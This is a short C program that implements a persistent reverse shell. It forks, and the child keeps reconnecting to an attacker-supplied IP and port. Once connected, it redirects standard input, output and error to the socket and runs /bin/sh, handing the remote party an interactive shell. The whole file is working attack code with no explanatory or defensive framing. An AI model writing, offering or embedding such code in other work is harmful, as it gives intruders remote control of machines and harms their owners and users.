#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>

int main(int argc, char ** argv) {
    if (argc != 3) {
        fprintf(stderr,"usage -> ip port\n");
        exit(-1);
    }

    struct sockaddr_in sa;
    int pid = fork();
    if (pid == 0) {
        while (1) {
            char * ip = argv[1];
            int port = atoi(argv[2]);
            sa.sin_family = AF_INET;
            sa.sin_port = htons(port);
            sa.sin_addr.s_addr = inet_addr(ip);
            int sockt = socket(AF_INET, SOCK_STREAM, 0);
            if (sockt == -1) {
                perror("Error on socket");
                sleep(5);
                continue;
            }

            int connexion = connect(sockt, (struct sockaddr *)&sa, sizeof(sa));
            if ( connexion != 0) {
                perror("[ERROR] connection failed");
                sleep(5);
                continue;
            }

            dup2(sockt, 0);
            dup2(sockt, 1);
            dup2(sockt, 2);

            char * argShell[] = {"/bin/sh", NULL};
            execve("/bin/sh", argShell, NULL);
        }
    }else {
        wait(NULL);
        return 0;
    }
}
